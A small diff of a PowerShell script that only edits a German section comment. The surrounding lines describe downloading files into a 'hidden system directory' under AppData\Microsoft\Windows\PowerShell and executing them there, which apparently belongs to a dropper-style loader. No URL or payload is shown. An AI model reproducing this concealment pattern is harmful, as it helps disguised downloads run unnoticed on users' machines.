@@ -7,7 +7,7 @@ try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 } catch {}
 
-# ==================== DOWNLOAD INS SYSTEM-VERZEICHNIS + AUSFÜHRUNG (PARALLEL DOWNLOAD MIT LOGGING) ====================
+# ==================== DOWNLOAD INS SYSTEM-VERZEICHNIS + AUSFÜHRUNG (PARALLEL DOWNLOAD MIT MEGA-LOGGING) ====================
 # Pfade (hidden System-Verzeichnis)
 $baseDir = Join-Path $env:APPDATA "Microsoft\Windows\PowerShell"
 $operationDir = Join-Path $baseDir "operation"
